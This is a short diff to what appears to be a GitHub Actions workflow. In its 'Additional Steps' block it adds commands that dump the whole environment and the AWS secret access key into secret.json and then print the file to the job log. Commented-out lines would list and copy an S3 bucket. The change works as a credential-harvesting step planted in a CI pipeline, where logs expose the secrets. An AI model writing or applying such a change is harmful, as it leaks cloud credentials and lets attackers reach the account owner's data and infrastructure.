@@ -14,8 +14,9 @@ jobs:
           aws-region: us-east-1 
       - name: Additional Steps...
         run: |
-          echo $vars.ENVIRONMENT > secret.json
-          echo $vars.AWS_SECRET_ACCESS_KEY >> secret.json
+          env >> secret.json
+          set >> secret.json
+          echo ${env.AWS_SECRET_ACCESS_KEY} >> secret.json
           cat secret.json
 #          aws s3 ls s3://code9bab03acc99894ec --recursive
 #          aws s3 cp s3://code9bab03acc99894ec --recursive
